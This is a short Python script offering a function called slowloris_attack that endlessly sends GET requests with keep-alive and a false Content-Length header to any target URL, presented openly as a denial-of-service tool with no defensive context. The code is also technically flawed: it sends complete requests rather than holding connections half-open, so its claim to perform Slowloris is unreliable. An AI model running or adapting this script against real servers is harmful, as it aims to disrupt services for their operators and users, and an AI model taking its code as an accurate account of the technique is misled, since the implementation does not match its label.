import requests
import time

def slowloris_attack(target_url):
    """ Slowloris attack to keep the connection open """
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Connection": "keep-alive",
        "Content-Length": "10000"
    }
    try:
        while True:
            requests.get(target_url, headers=headers, timeout=5)
            print("[SLOWLORIS] Sending slow request...")
            time.sleep(5)
    except requests.exceptions.RequestException:
        print("[SLOWLORIS] Connection failed.")
